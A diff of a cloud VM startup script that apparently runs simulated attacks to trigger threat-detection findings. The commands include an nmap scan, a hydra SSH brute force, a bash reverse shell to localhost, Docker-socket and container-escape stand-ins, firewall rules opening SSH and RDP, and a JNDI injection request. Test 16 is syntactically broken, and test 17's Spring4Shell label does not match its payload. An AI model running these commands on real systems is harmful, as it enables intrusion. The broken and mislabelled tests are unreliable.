@@ -22,17 +22,17 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 	gcloud storage cp gs://plat-g-data-store/logcron.sh /usr/share/logcron.sh
 
 	# Add Docker's official GPG key:
-	sudo apt-get update
-	sudo apt-get install ca-certificates curl
-	sudo install -m 0755 -d /etc/apt/keyrings
-	sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
-	sudo chmod a+r /etc/apt/keyrings/docker.asc
-	echo \
-	  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
-	  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-	  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-	sudo apt-get update
-	sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
+	#sudo apt-get update
+	#sudo apt-get install ca-certificates curl
+	#sudo install -m 0755 -d /etc/apt/keyrings
+	#sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+	#sudo chmod a+r /etc/apt/keyrings/docker.asc
+	#echo \
+	#  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
+	#  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
+	#  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+	#sudo apt-get update
+	#sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
 
 #the next line creates an empty file so it won't run the next boot
    sudo touch "$SETUPCOMPLETE"
@@ -42,8 +42,8 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 	mv /var/log/gcp-fr.log /var/log/fr-gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt 
  	#shutdown
 else
-   echo "Second Run"
-
+   echo "Testing Run"
+sleep 180
 # 1 - AWS simulate internal recon and attempted lateral movement
 echo "start test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 sudo nmap -sT 10.1.1.2
@@ -51,7 +51,7 @@ echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 3 
 echo "start test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-hydra -f -l user -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.2 -t 4 ssh
+hydra -f -l user -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
 echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 4 Calling bitcoin wallets to download mining toolkits
@@ -65,6 +65,23 @@ echo "start test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 dig -f /usr/share/wordlists/dns-exfil.txt  > /dev/null &
 echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
+# 6 - AWS PrivilegeEscalation:Runtime/DockerSocketAccessed
+echo "start test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+bash -c 'nc -lU /var/run/docker.sock &'
+echo SocketAccessed | nc -w5 -U /var/run/docker.sock
+echo "stop test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
+# 7 - AWS PrivilegeEscalation:Runtime/RuncContainerEscape
+echo "start test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+sudo touch /bin/runc
+sudo echo "Runc Container Escape" > /bin/runc
+echo "stop test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
+# 8 - AWS PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified
+echo "start test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+sudo touch /tmp/release_agent
+sudo echo "Release Agent Modified" > /tmp/release_agent
+echo "stop test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 9 - Execution:Runtime/ReverseShell
 echo "start test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
@@ -74,9 +91,35 @@ bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
 exec "$@"
 echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
+#15 - 3.xx - Firewall rules modified to open SSH
+echo "start test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+gcloud compute firewall-rules create allowssh \
+--allow=tcp:22 \
+--description="Allow incoming traffic on TCP port 22" \
+--direction=INGRESS \
+--target-tags=bitbucket
+echo "stop test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
+#16 - 3.xx - Firewall rules modified to open RDP
+gcloud compute firewall-rules create allowrdp \
+echo "start test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+--allow=tcp:3389 \
+--description="Allow incoming traffic on TCP port 3389" \
+--direction=INGRESS \
+--target-tags=bitbucket
+echo "stop test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
+#17 - 6.23 - Spring4Shell vulnerability exploit attempts (CVE-2022-22965)
+echo "start test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+curl https://10.1.1.3/?url=https://localhost&username=${jndi:ldap://${hostName}.localhost/test}
+echo "stop test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
+#lets export out logs 
 cp log.txt /var/log/gcp.log
 gcloud storage cp /var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
 mv /var/log/gcp.log /var/log/gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt 
-#shutdown
+
+sleep 180
+shutdown
 
 fi
